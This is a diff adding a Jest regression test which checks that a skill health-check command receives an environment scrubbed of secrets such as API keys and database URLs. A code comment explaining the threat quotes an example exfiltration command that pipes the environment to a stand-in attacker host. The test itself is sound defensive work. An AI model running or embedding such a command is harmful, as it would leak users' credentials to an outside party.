@@ -96,6 +96,31 @@ describe('runSkillHealthCheck', () => {
     expect(result.error).toBe('Exited with code 2');
   });
 
+  // Codex round-3 regression: skill health-check exec must run with a
+  // scrubbed shell-task env, not the full process.env. Otherwise a
+  // hostile / compromised skill manifest could exfil secrets via a
+  // "health check" that's really `env | curl evil.example`.
+  it('passes a scrubbed env (no secrets) to exec', async () => {
+    const ENV_BACKUP = { ...process.env };
+    process.env.DASHBOARD_TOKEN = 'should-not-leak';
+    process.env.ANTHROPIC_API_KEY = 'should-not-leak';
+    process.env.DATABASE_URL = 'postgres://should-not-leak';
+    try {
+      simulateExec({ stdout: 'OK', exitCode: 0 });
+      await runSkillHealthCheck('gmail', 'echo OK');
+      const passedEnv = (mockExec.mock.calls[0]?.[1] as { env?: Record<string, string> } | undefined)?.env;
+      expect(passedEnv).toBeDefined();
+      expect(passedEnv!.DASHBOARD_TOKEN).toBeUndefined();
+      expect(passedEnv!.ANTHROPIC_API_KEY).toBeUndefined();
+      expect(passedEnv!.DATABASE_URL).toBeUndefined();
+    } finally {
+      for (const k of Object.keys(process.env)) {
+        if (!(k in ENV_BACKUP)) delete process.env[k];
+      }
+      Object.assign(process.env, ENV_BACKUP);
+    }
+  });
+
   it('returns timeout when command times out', async () => {
     simulateExec({ timeout: true });
 
